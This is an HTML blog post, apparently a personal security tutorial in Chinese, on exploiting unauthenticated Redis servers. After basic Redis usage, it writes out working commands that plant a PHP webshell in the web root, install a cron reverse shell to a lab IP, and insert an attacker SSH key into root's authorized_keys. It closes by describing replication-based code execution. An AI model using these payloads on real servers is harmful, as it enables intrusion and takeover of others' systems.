@@ -1,0 +1,338 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="环境配置1234567891011wget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-5.0.7.tar.gztar xvf redis-4.0.8.tar.gzcd redis-4.0.8make# 进入src目录# 将redis-cli和redis-server拷贝到&#x2F;usr&#x2F;bin目录# 启动redisredis-server redis.conf# 默">
+<meta property="og:type" content="article">
+<meta property="og:title" content="浅析Redis漏洞利用">
+<meta property="og:url" content="https://tefuir72.github.io/2021/10/11/2021101120/index.html">
+<meta property="og:site_name" content="TeFuir">
+<meta property="og:description" content="环境配置1234567891011wget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-5.0.7.tar.gztar xvf redis-4.0.8.tar.gzcd redis-4.0.8make# 进入src目录# 将redis-cli和redis-server拷贝到&#x2F;usr&#x2F;bin目录# 启动redisredis-server redis.conf# 默">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-10-11T04:16:51.000Z">
+<meta property="article:modified_time" content="2021-10-13T12:05:02.540Z">
+<meta property="article:author" content="Te Fuir">
+<meta property="article:tag" content="redis">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>浅析Redis漏洞利用</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/projects_url">Projects</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post " href="/2021/10/12/hello-world/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post " href="/2021/10/06/2021101011/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://tefuir72.github.io/2021/10/11/2021101120/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://tefuir72.github.io/2021/10/11/2021101120/&text=浅析Redis漏洞利用"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://tefuir72.github.io/2021/10/11/2021101120/&title=浅析Redis漏洞利用"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://tefuir72.github.io/2021/10/11/2021101120/&is_video=false&description=浅析Redis漏洞利用"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=浅析Redis漏洞利用&body=Check out this article: https://tefuir72.github.io/2021/10/11/2021101120/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://tefuir72.github.io/2021/10/11/2021101120/&title=浅析Redis漏洞利用"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://tefuir72.github.io/2021/10/11/2021101120/&title=浅析Redis漏洞利用"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://tefuir72.github.io/2021/10/11/2021101120/&title=浅析Redis漏洞利用"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://tefuir72.github.io/2021/10/11/2021101120/&title=浅析Redis漏洞利用"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://tefuir72.github.io/2021/10/11/2021101120/&name=浅析Redis漏洞利用&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://tefuir72.github.io/2021/10/11/2021101120/&t=浅析Redis漏洞利用"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">1.</span> <span class="toc-text">环境配置</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#redis%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8"><span class="toc-number">1.1.</span> <span class="toc-text">redis简单使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-number">1.2.</span> <span class="toc-text">未授权访问</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E5%85%A5shell"><span class="toc-number">1.3.</span> <span class="toc-text">写入shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E5%85%A5ssh"><span class="toc-number">1.4.</span> <span class="toc-text">写入ssh</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6"><span class="toc-number">1.5.</span> <span class="toc-text">远程主从复制</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.5.1.</span> <span class="toc-text">原理</span></a></li></ol></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        浅析Redis漏洞利用
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Te Fuir</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-10-11T04:16:51.000Z" itemprop="datePublished">2021-10-11</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/web/">web</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/redis/" rel="tag">redis</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">wget http://download.redis.io/releases/redis-5.0.7.tar.gz</span><br><span class="line">tar xvf redis-4.0.8.tar.gz</span><br><span class="line"><span class="built_in">cd</span> redis-4.0.8</span><br><span class="line">make</span><br><span class="line"><span class="comment"># 进入src目录</span></span><br><span class="line"><span class="comment"># 将redis-cli和redis-server拷贝到/usr/bin目录</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动redis</span></span><br><span class="line">redis-server redis.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 默认端口为6379，无密码</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="redis简单使用"><a href="#redis简单使用" class="headerlink" title="redis简单使用"></a>redis简单使用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 本地连接</span></span><br><span class="line">redis-cli -h 127.0.0.1 -p 6379</span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试连接</span></span><br><span class="line">127.0.0.1:6379&gt; ping</span><br><span class="line">PONG</span><br><span class="line"></span><br><span class="line"><span class="comment"># 切换数据库</span></span><br><span class="line">127.0.0.1:6379&gt; select 1</span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭服务</span></span><br><span class="line">127.0.0.1:6379&gt; shutdown</span><br><span class="line">not connected&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># string类型</span></span><br><span class="line">127.0.0.1:6379&gt; <span class="built_in">set</span> var hello</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; get var</span><br><span class="line"><span class="string">&quot;hello&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; <span class="built_in">set</span> num 1</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; incr num</span><br><span class="line">(<span class="built_in">integer</span>) 2</span><br><span class="line">127.0.0.1:6379&gt; get num</span><br><span class="line"><span class="string">&quot;2&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; decr num</span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; get num</span><br><span class="line"><span class="string">&quot;1&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; incrby num 5</span><br><span class="line">(<span class="built_in">integer</span>) 6</span><br><span class="line">127.0.0.1:6379&gt; get num</span><br><span class="line"><span class="string">&quot;6&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; append num 44</span><br><span class="line">(<span class="built_in">integer</span>) 3</span><br><span class="line">127.0.0.1:6379&gt; get num</span><br><span class="line"><span class="string">&quot;644&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; strlen num</span><br><span class="line">(<span class="built_in">integer</span>) 3</span><br><span class="line">127.0.0.1:6379&gt; mset v1 123 v2 456</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; mget v1 v2</span><br><span class="line">1) <span class="string">&quot;123&quot;</span></span><br><span class="line">2) <span class="string">&quot;456&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; </span><br><span class="line"></span><br><span class="line"><span class="comment"># hash类型</span></span><br><span class="line">127.0.0.1:6379&gt; hset user name tom</span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; hget user name</span><br><span class="line"><span class="string">&quot;tom&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; hmset user name peter age 5</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; hmget user name age</span><br><span class="line">1) <span class="string">&quot;peter&quot;</span></span><br><span class="line">2) <span class="string">&quot;5&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; hgetall user</span><br><span class="line">1) <span class="string">&quot;name&quot;</span></span><br><span class="line">2) <span class="string">&quot;peter&quot;</span></span><br><span class="line">3) <span class="string">&quot;age&quot;</span></span><br><span class="line">4) <span class="string">&quot;5&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; hexists user noname</span><br><span class="line">(<span class="built_in">integer</span>) 0</span><br><span class="line">127.0.0.1:6379&gt; hexists user name</span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; </span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询所有键</span></span><br><span class="line">127.0.0.1:6379&gt; keys *</span><br><span class="line">1) <span class="string">&quot;v2&quot;</span></span><br><span class="line">2) <span class="string">&quot;v1&quot;</span></span><br><span class="line">3) <span class="string">&quot;num&quot;</span></span><br><span class="line">4) <span class="string">&quot;var&quot;</span></span><br><span class="line">5) <span class="string">&quot;user&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; select 2</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379[2]&gt; keys *</span><br><span class="line">(empty array)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除键</span></span><br><span class="line">127.0.0.1:6379[1]&gt; get a</span><br><span class="line"><span class="string">&quot;1&quot;</span></span><br><span class="line">127.0.0.1:6379[1]&gt; del a</span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379[1]&gt; get a</span><br><span class="line">(nil)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 类型</span></span><br><span class="line">127.0.0.1:6379[1]&gt; <span class="built_in">set</span> a hello</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379[1]&gt; get a</span><br><span class="line"><span class="string">&quot;hello&quot;</span></span><br><span class="line">127.0.0.1:6379[1]&gt; <span class="built_in">type</span> a</span><br><span class="line">string</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重命名</span></span><br><span class="line">127.0.0.1:6379[1]&gt; rename a b</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379[1]&gt; get b</span><br><span class="line"><span class="string">&quot;hello&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 随即返回</span></span><br><span class="line">127.0.0.1:6379[1]&gt; randomkey</span><br><span class="line"><span class="string">&quot;b&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 清除数据库，flushdb只清除当前数据库，flushall清除所有数据库</span></span><br><span class="line">127.0.0.1:6379[1]&gt; flushdb</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379[1]&gt; flushall</span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line"><span class="comment"># 服务器信息</span></span><br><span class="line">info</span><br><span class="line"></span><br><span class="line"><span class="comment"># 实时打印出redis服务器接收到的指令</span></span><br><span class="line">127.0.0.1:6379[1]&gt; monitor</span><br><span class="line">OK</span><br><span class="line">1633957062.879456 [0 127.0.0.1:43850] <span class="string">&quot;COMMAND&quot;</span></span><br><span class="line">1633957064.798504 [0 127.0.0.1:43850] <span class="string">&quot;ping&quot;</span></span><br><span class="line">1633957079.255817 [0 127.0.0.1:43850] <span class="string">&quot;set&quot;</span> <span class="string">&quot;iii&quot;</span> <span class="string">&quot;hello&quot;</span></span><br><span class="line">1633957145.468642 [0 127.0.0.1:43850] <span class="string">&quot;echo&quot;</span> <span class="string">&quot;helloworld&quot;</span></span><br><span class="line"></span><br><span class="line">redis-cli -p 6379</span><br><span class="line">127.0.0.1:6379&gt; ping</span><br><span class="line">PONG</span><br><span class="line">127.0.0.1:6379&gt; <span class="built_in">set</span> iii hello</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; <span class="built_in">echo</span> helloworld</span><br><span class="line"><span class="string">&quot;helloworld&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; </span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">cat redis.conf|grep <span class="built_in">bind</span></span><br><span class="line"><span class="comment"># By default, if no &quot;bind&quot; configuration directive is specified, Redis listens</span></span><br><span class="line"><span class="comment"># the &quot;bind&quot; configuration directive, followed by one or more IP addresses.</span></span><br><span class="line"><span class="comment"># bind 192.168.1.100 10.0.0.1</span></span><br><span class="line"><span class="comment"># bind 127.0.0.1 ::1</span></span><br><span class="line"><span class="comment"># internet, binding to all the interfaces is dangerous and will expose the</span></span><br><span class="line"><span class="comment"># following bind directive, that will force Redis to listen only into</span></span><br><span class="line"><span class="built_in">bind</span> 127.0.0.1</span><br><span class="line"><span class="comment"># 1) The server is not binding explicitly to a set of addresses using the</span></span><br><span class="line"><span class="comment">#    &quot;bind&quot; directive.</span></span><br><span class="line"><span class="comment"># are explicitly listed using the &quot;bind&quot; directive.</span></span><br><span class="line"></span><br><span class="line">cat redis.conf|grep protected-mode</span><br><span class="line">protected-mode yes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vim redis.conf</span><br><span class="line"><span class="comment"># 在 bind 127.0.0.1 前加上 # 注释掉</span></span><br><span class="line"><span class="comment"># 去掉IP绑定，允许除本地外的主机登陆redis服务</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将 protected-mode 改为 no</span></span><br><span class="line"><span class="comment"># 关闭保护模式，允许远程连接redis服务</span></span><br><span class="line"><span class="comment"># protected-mode是Redis3.2版本新增的安全配置项，开启后要求需要配置bind ip或者设置访问密码，关闭后是允许远程连接</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="写入shell"><a href="#写入shell" class="headerlink" title="写入shell"></a>写入shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## webshell</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 切换到网站的根目录</span></span><br><span class="line">127.0.0.1:6379&gt; config <span class="built_in">set</span> dir /var/www/html/</span><br><span class="line">OK</span><br><span class="line"><span class="comment"># 生成恶意文件</span></span><br><span class="line">127.0.0.1:6379&gt; config <span class="built_in">set</span> dbfilename evil.php</span><br><span class="line">OK</span><br><span class="line"><span class="comment"># 写入恶意代码到内存中，这里的\n\n\n代表换行的意思，用redis写入文件的会自带一些版本信息，如果不换行可能会导致无法执行.</span></span><br><span class="line">127.0.0.1:6379&gt; <span class="built_in">set</span> aaa <span class="string">&quot;\n\n\n&lt;?php @eval(<span class="variable">$_POST</span>[&#x27;cmd&#x27;]);?&gt;\n\n\n&quot;</span></span><br><span class="line">OK</span><br><span class="line"><span class="comment"># 将内存中的数据导出到磁盘</span></span><br><span class="line">127.0.0.1:6379&gt; save</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /var/www/html</span><br><span class="line">cat evil.php    </span><br><span class="line">REDIS0009�      redis-ver6.0.8�</span><br><span class="line">�edis-bits�@�ctime�A6daused-mem¨3</span><br><span class="line"> aof-preamble���iiihelloaaa<span class="comment">#</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">���LC��     </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## 计划任务反弹shell</span></span><br><span class="line">127.0.0.1:6379&gt; config <span class="built_in">set</span> dir /var/spool/cron/</span><br><span class="line">OK</span><br><span class="line"><span class="comment"># config set dir /var/spool/cron/crontabs</span></span><br><span class="line"><span class="comment"># /var/spool/cron/crontabs kali和ubuntu的定时任务文件</span></span><br><span class="line"><span class="comment"># /var/spool/cron/ centos的定时任务目录</span></span><br><span class="line">127.0.0.1:6379&gt; config <span class="built_in">set</span> dbfilename root</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; <span class="built_in">set</span> aaa <span class="string">&quot;\n\n\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.253.128/10700 0&gt;&amp;1\n\n\n&quot;</span></span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; save</span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## 以下几点注意</span></span><br><span class="line"><span class="comment"># root文件600权限执行</span></span><br><span class="line">ls -al /var/spool/cron/crontabs</span><br><span class="line"></span><br><span class="line">total 12</span><br><span class="line">drwx-wx--T 2 root crontab 4096 Oct 11 09:17 .</span><br><span class="line">drwxr-xr-x 3 root root    4096 Oct 11 09:15 ..</span><br><span class="line">-rw-r--r-- 1 root root     176 Oct 11 09:17 root</span><br><span class="line"></span><br><span class="line">chmod 600  /var/spool/cron/crontabs/root</span><br><span class="line">cat /var/spool/cron/crontabs/root       </span><br><span class="line">REDIS0009�      redis-ver6.0.8�</span><br><span class="line">�edis-bits�@�ctime�V9daused-mem��3</span><br><span class="line"> aof-preamble���iiihelloaaa&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">* * * * * bash -i &gt;&amp; /dev/tcp/192.168.253.128/10700 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">��[x�MB�;   </span><br><span class="line"></span><br><span class="line"><span class="comment"># 反弹shell的shell环境是bash，而kali中的/bin/sh这个软连接指向了dash</span></span><br><span class="line"><span class="comment"># 改变软链接</span></span><br><span class="line">ln -s -f dash /bin/sh  </span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="写入ssh"><a href="#写入ssh" class="headerlink" title="写入ssh"></a>写入ssh</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建ssh密钥</span></span><br><span class="line">ssh-keygen -t rsa</span><br><span class="line"></span><br><span class="line"><span class="comment"># 公钥导入key.txt</span></span><br><span class="line">(<span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>; cat id_rsa.pub; <span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>) &gt; key.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 公钥写入服务器</span></span><br><span class="line">cat key.txt | redis-cli -h 192.168.190.128 -x <span class="built_in">set</span> aaa</span><br><span class="line"><span class="comment"># -x 代表从标准输入读取数据作为该命令的最后一个参数</span></span><br><span class="line"></span><br><span class="line">config <span class="built_in">set</span> dir /root/.ssh</span><br><span class="line">config <span class="built_in">set</span> dbfilename authorized_keys</span><br><span class="line">save</span><br><span class="line"></span><br><span class="line"><span class="comment"># ssh登录</span></span><br><span class="line">ssh -i id_rsa root@192.168.190.128</span><br></pre></td></tr></table></figure>
+
+<h3 id="远程主从复制"><a href="#远程主从复制" class="headerlink" title="远程主从复制"></a>远程主从复制</h3><blockquote>
+<p>漏洞存在于4.x、5.x版本中，Redis提供了主从模式，主从模式指使用一个redis作为主机，其他的作为备份机，主机从机数据都是一样的，从机负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。</p>
+<p>在redis  4.x之后，通过外部拓展可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载恶意so文件，即可执行命令。</p>
+</blockquote>
+<p><strong>利用工具</strong></p>
